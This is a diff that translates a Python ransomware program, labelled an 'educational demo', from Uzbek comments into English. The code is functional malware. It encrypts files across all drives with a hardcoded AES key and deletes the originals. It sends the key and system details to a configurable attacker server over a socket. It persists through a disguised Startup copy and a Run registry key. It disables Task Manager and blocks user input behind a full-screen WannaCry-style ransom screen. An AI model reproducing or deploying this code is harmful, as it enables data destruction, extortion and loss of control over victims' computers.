@@ -1,3 +1,11 @@
+
+---
+
+## 🐍 Python Code (English Comments & Variable Names)
+
+Below is the same educational ransomware demo, translated into English with clear comments.
+
+```python
 import os
 import sys
 import time
@@ -8,53 +16,54 @@ import json
 import platform
 import getpass
 import shutil
-import subprocess
 import ctypes
 import tkinter as tk
 from tkinter import messagebox
 
-# ==================== SOZLAMALAR ====================
-# O'zingizning IP va portingizni shu yerga kiriting
-SERVER_IP = "192.168.1.100"    # <--- O'ZGARTIRING
-SERVER_PORT = 4444             # <--- O'ZGARTIRING
+# ==================== CONFIGURATION ====================
+# Change these to your own IP and port
+SERVER_IP = "192.168.1.100"    # <-- CHANGE THIS
+SERVER_PORT = 4444             # <-- CHANGE THIS
 
-KEY = b"apple77777777"          # Shifrlash kaliti (UI da ko'rsatilmaydi)
-TIMER_HOURS = 24                # Ortga sanash (soat)
-# TEST UCHUN: TIMER_HOURS=0, TIMER_MINUTES=0, TIMER_SECONDS=10 qilib o'zgartiring
+KEY = b"apple77777777"          # Encryption key (not shown in UI)
+TIMER_HOURS = 24                # Countdown hours
+# For quick test: TIMER_HOURS=0, TIMER_MINUTES=0, TIMER_SECONDS=10
 TIMER_MINUTES = 0
 TIMER_SECONDS = 0
 
-# Butun tizimni shifrlashda shifrlanmasligi kerak bo'lgan kengaytmalar
+# File extensions that will NOT be encrypted (to keep OS running)
 EXCLUDE_EXTENSIONS = {
     ".exe", ".dll", ".sys", ".py", ".pyd", ".pyc", ".so", ".lib", ".ini",
     ".bat", ".cmd", ".com", ".msi", ".bin", ".iso", ".vhd", ".vmdk", ".vdi",
     ".bak", ".tmp", ".log", ".lnk", ".msu", ".mui", ".drv", ".cat", ".inf",
     ".pol", ".dat", ".manifest", ".mui", ".chm", ".hlp", ".cpl", ".scr"
 }
-# ====================================================
+# =======================================================
 
-# AES kalitini tayyorlash (SHA-256)
+# Derive AES key from password using SHA-256
 AES_KEY = hashlib.sha256(KEY).digest()
-IV = b"1234567890123456"   # 16 baytlik qat'iy IV (soddalashtirilgan)
+IV = b"1234567890123456"   # Fixed 16-byte IV (simplified)
 
-# Cryptography importlari
+# Cryptography imports
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
 def pad(data):
+    """PKCS7 padding"""
     pad_len = 16 - (len(data) % 16)
     return data + bytes([pad_len] * pad_len)
 
 def unpad(data):
+    """Remove PKCS7 padding"""
     pad_len = data[-1]
     return data[:-pad_len]
 
 def should_encrypt(filepath):
-    """Fayl shifrlanishi kerakmi yoki yo'qmi aniqlaydi"""
+    """Determine whether a file should be encrypted"""
     ext = os.path.splitext(filepath)[1].lower()
     if ext in EXCLUDE_EXTENSIONS:
         return False
-    # O'z papkamizdagi fayllarni shifrlamaymiz (zaruriy)
+    # Skip the directory where the executable is located
     try:
         exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
         if os.path.abspath(filepath).startswith(exe_dir):
@@ -64,7 +73,7 @@ def should_encrypt(filepath):
     return True
 
 def encrypt_file(filepath):
-    """Faylni shifrlaydi va .locked kengaytmasini qo'shadi"""
+    """Encrypt a file and add .locked extension"""
     try:
         if not should_encrypt(filepath):
             return False
@@ -77,30 +86,28 @@ def encrypt_file(filepath):
             f.write(ciphertext)
         os.remove(filepath)
         return True
-    except Exception as e:
-        # print(f"Shifrlashda xato {filepath}: {e}")
+    except Exception:
         return False
 
 def decrypt_file(filepath):
-    """.locked faylini deshifrlaydi va asl nomini tiklaydi"""
+    """Decrypt a .locked file and restore original name"""
     try:
         with open(filepath, 'rb') as f:
             ciphertext = f.read()
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=default_backend())
         decryptor = cipher.decryptor()
         plaintext = unpad(decryptor.update(ciphertext) + decryptor.finalize())
-        original_name = filepath[:-7]   # .locked ni olib tashlash
+        original_name = filepath[:-7]   # remove ".locked"
         with open(original_name, 'wb') as f:
             f.write(plaintext)
         os.remove(filepath)
         return True
-    except Exception as e:
-        # print(f"Deshifrlashda xato {filepath}: {e}")
+    except Exception:
         return False
 
-# ================= SERVERGA YUBORISH =================
+# ================= SEND DATA TO SERVER =================
 def send_info_to_server():
-    """Serverga kalit va tizim ma'lumotlarini yuboradi"""
+    """Send encryption key and system information to the attacker's server"""
     try:
         data = {
             "key": KEY.decode(),
@@ -116,16 +123,16 @@ def send_info_to_server():
         sock.connect((SERVER_IP, SERVER_PORT))
         sock.sendall(serialized.encode())
         sock.close()
-    except Exception as e:
+    except Exception:
         pass
 
 # ================= PERSISTENCE (AUTOSTART) =================
 def add_to_startup():
-    """Dasturni tizimga autostart qilib qo'shadi (qayta yuklanganda ham ishga tushadi)"""
+    """Add program to startup (so it survives reboot)"""
     try:
         if os.name == 'nt':
             import winreg
-            # 1. Startup papkasiga nusxalash
+            # Copy to Startup folder
             startup_dir = os.path.join(
                 os.environ.get('APPDATA', ''),
                 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
@@ -134,18 +141,18 @@ def add_to_startup():
             new_path = os.path.join(startup_dir, 'system_update.exe')
             if not os.path.exists(new_path):
                 shutil.copy2(exe_path, new_path)
-            # 2. Registry Run kalitiga yozish
+            # Add Registry Run key
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                 winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, new_path)
             return True
-    except Exception as e:
+    except Exception:
         pass
     return False
 
 def remove_from_startup():
-    """Autostart yozuvlarini o'chiradi (deshifrlashdan keyin)"""
+    """Remove autostart entries after decryption"""
     try:
         if os.name == 'nt':
             import winreg
@@ -166,30 +173,27 @@ def remove_from_startup():
     except:
         pass
 
-# ================= TIZIMNI BLOKLASH =================
+# ================= SYSTEM LOCKDOWN =================
 def block_system():
-    """Task Manager, oynani yopish, Alt+F4 va boshqalarni bloklaydi"""
+    """Disable Task Manager, Lock Workstation, and block input"""
     try:
         if os.name == 'nt':
             import winreg
-            # Task Manager ni o'chirish
+            # Disable Task Manager
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
             with winreg.CreateKey(key, subkey) as regkey:
                 winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-            # Ctrl+Alt+Del ni qisman cheklash (LockWorkstation)
+            # Disable Lock Workstation
             with winreg.CreateKey(key, subkey) as regkey:
                 winreg.SetValueEx(regkey, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
-            # CMD ni o'chirish (ixtiyoriy)
-            # with winreg.CreateKey(key, subkey) as regkey:
-            #     winreg.SetValueEx(regkey, "DisableCMD", 0, winreg.REG_DWORD, 1)
-            # Kiritishni bloklash (sichqoncha va klaviatura)
+            # Block all input (keyboard and mouse)
             ctypes.windll.user32.BlockInput(True)
-    except Exception as e:
+    except Exception:
         pass
 
 def unblock_system():
-    """Bloklangan tizimni tiklaydi"""
+    """Restore blocked system functions"""
     try:
         if os.name == 'nt':
             import winreg
@@ -208,9 +212,9 @@ def unblock_system():
     except:
         pass
 
-# ================= SHIFRLASH / DESHIFRLASH =================
+# ================= ENCRYPT / DECRYPT SYSTEM =================
 def encrypt_system():
-    """Barcha disklardagi fayllarni shifrlaydi (ruxsat doirasida)"""
+    """Encrypt files on all drives (where permissions allow)"""
     if os.name == 'nt':
         drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     else:
@@ -225,7 +229,7 @@ def encrypt_system():
                 encrypt_file(filepath)
 
 def decrypt_system():
-    """Barcha .locked fayllarni tiklaydi"""
+    """Decrypt all .locked files"""
     if os.name == 'nt':
         drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     else:
@@ -240,29 +244,29 @@ def decrypt_system():
                     filepath = os.path.join(root, file)
                     decrypt_file(filepath)
 
-# ================= INTERFEYS (WannaCry uslubida) =================
+# ================= GUI (WannaCry style) =================
 class RansomwareDemo:
     def __init__(self, master):
         self.master = master
         master.title("Ooops, your files have been encrypted!")
-        master.attributes('-fullscreen', True)   # To'liq ekran
-        master.attributes('-topmost', True)      # Doim oldinda
-        master.overrideredirect(True)            # Oyna ramkasini olib tashlash
+        master.attributes('-fullscreen', True)
+        master.attributes('-topmost', True)
+        master.overrideredirect(True)   # Remove window border
         master.configure(bg='black')
 
-        # Oynani yopishga urinishlarni bloklash
+        # Block window closing
         master.protocol("WM_DELETE_WINDOW", self.block_close)
 
-        # Asosiy konteyner
+        # Main container
         container = tk.Frame(master, bg='black')
         container.pack(fill=tk.BOTH, expand=True)
 
-        # Chap qizil panel
+        # Left red panel
         left_panel = tk.Frame(container, bg='#8B0000', width=250)
         left_panel.pack(side=tk.LEFT, fill=tk.Y)
         left_panel.pack_propagate(False)
 
-        # Katta ogohlantirish belgisi
+        # Big warning sign
         warning_label = tk.Label(
             left_panel,
             text="!",
@@ -272,11 +276,11 @@ class RansomwareDemo:
         )
         warning_label.pack(pady=60)
 
-        # O'ng panel (matnlar)
+        # Right panel (text)
         right_panel = tk.Frame(container, bg='black')
         right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
-        # Sarlavha
+        # Title
         title = tk.Label(
             right_panel,
             text="Ooops, your files have been encrypted!",
@@ -286,7 +290,7 @@ class RansomwareDemo:
         )
         title.pack(pady=20)
 
-        # Tavsif
+        # Description
         desc = tk.Label(
             right_panel,
             text="What happened to my computer?\n\n"
@@ -300,7 +304,7 @@ class RansomwareDemo:
         )
         desc.pack(pady=20)
 
-        # Taymer
+        # Timer
         self.timer_label = tk.Label(
             right_panel,
             text="",
@@ -310,7 +314,7 @@ class RansomwareDemo:
         )
         self.timer_label.pack(pady=30)
 
-        # Qo'shimcha matn
+        # Footer note
         note = tk.Label(
             right_panel,
             text="testing by agrresore",
@@ -320,20 +324,19 @@ class RansomwareDemo:
         )
         note.pack(side=tk.BOTTOM, pady=10)
 
-        # Tizimni bloklash va serverga yuborish (threadda)
+        # Start lockdown and data exfiltration in threads
         threading.Thread(target=block_system, daemon=True).start()
         threading.Thread(target=send_info_to_server, daemon=True).start()
 
-        # Shifrlashni boshlash (threadda)
+        # Start encryption in thread
         threading.Thread(target=encrypt_system, daemon=True).start()
 
-        # Taymerni boshlash
+        # Start countdown
         self.remaining = TIMER_HOURS * 3600 + TIMER_MINUTES * 60 + TIMER_SECONDS
         self.update_timer()
 
     def block_close(self):
-        """Oynani yopishga urinishlarni bloklaydi"""
-        # Hech narsa qilmaymiz – oyna yopilmaydi
+        """Prevent window from closing"""
         pass
 
     def update_timer(self):
@@ -349,22 +352,22 @@ class RansomwareDemo:
             self.decrypt_files()
 
     def decrypt_files(self):
-        # Deshifrlashni threadda bajarish
+        # Decrypt in thread
         threading.Thread(target=decrypt_system, daemon=True).start()
-        # Tizimni tiklash
+        # Unblock system and remove persistence
         threading.Thread(target=unblock_system, daemon=True).start()
         threading.Thread(target=remove_from_startup, daemon=True).start()
-        # Xabar ko'rsatish
+        # Show message
         messagebox.showinfo(
-            "Qayta tiklandi",
-            "Barcha fayllaringiz muvaffaqiyatli qayta tiklandi!\n"
-            "Endi kompyuteringizdan foydalanishingiz mumkin."
+            "Restored",
+            "All your files have been successfully restored!\n"
+            "You can now use your computer."
         )
         self.master.destroy()
 
-# ================= ASOSIY DASTUR =================
+# ================= MAIN =================
 if __name__ == "__main__":
-    # Autostartni qo'shish (agar allaqachon mavjud bo'lmasa)
+    # Add persistence (will run again after reboot)
     add_to_startup()
 
     root = tk.Tk()
